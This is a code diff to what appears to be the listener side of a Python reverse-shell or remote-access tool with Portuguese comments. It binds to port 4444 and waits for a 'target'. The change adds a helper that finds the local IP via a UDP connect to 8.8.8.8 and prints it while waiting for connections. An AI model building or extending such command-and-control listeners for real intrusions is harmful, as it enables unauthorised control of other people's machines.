@@ -8,6 +8,17 @@ def data_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
 
+def get_current_ip():
+    """Obtém o IP atual da máquina (não o localhost)."""
+    try:
+        # Cria um socket temporário para determinar o IP externo
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))  # Conecta ao Google DNS (ou qualquer IP acessível)
+            ip = s.getsockname()[0]
+        return ip
+    except Exception as e:
+        print(colored(f"[!] Não foi possível obter o IP atual: {e}", 'red'))
+
 def data_recv():
     """Recebe dados do alvo."""
     data = ''
@@ -92,8 +103,9 @@ def t_commun():
 # Configurando o socket do servidor
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
+    current_ip = get_current_ip()
     sock.bind(('172.22.168.27', 4444))
-    print(colored('[-] Aguardando conexões', 'yellow'))
+    print(colored(f'[-] {current_ip} Aguardando conexões', 'yellow'))
     sock.listen(5)
 
     target, ip = sock.accept()
